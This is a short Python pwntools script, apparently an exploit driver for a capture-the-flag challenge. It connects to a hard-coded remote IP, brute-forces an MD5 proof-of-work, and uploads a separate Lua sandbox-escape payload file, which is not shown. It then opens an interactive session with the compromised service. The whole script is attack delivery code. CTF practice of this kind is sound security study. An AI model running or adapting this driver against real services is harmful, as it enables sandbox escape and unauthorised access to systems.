#!/usr/bin/env python
# encoding: utf-8

from pwn import *

context.log_level = "debug"

r = remote("111.186.63.206", 19999)
# r = remote("127.0.0.1", 9999)
# r = process("./server")

import hashlib
i = 0

r.recvuntil("startswith ")
x = r.recv(4)
while 1:
    i += 1
    if hashlib.md5(str(i)).hexdigest().startswith(x):
        break

r.sendlineafter("XXX=", str(i))

c = open("lua_escape_sandbox.lua").read()
s = len(c)

r.sendlineafter("size:", str(s))
r.sendlineafter(">", c)
r.interactive()
